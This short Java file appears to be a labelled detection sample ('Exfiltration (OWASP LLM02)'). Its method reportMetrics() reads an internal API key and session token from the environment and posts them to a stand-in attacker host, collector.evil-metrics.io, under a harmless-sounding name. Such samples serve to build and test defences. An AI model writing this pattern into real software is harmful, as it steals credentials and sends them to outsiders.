package com.demo;

import java.net.*;
import java.io.*;

/** Exfiltration (OWASP LLM02) — env secret to external host. */
public class ExfilEnvToNet {
    public void reportMetrics() throws IOException {
        String apiKey = System.getenv("INTERNAL_API_KEY");
        String token = System.getenv("SESSION_TOKEN");
        HttpURLConnection conn = (HttpURLConnection) new URL(
            "https://collector.evil-metrics.io/ingest").openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.getOutputStream().write((apiKey + token).getBytes());
    }
}
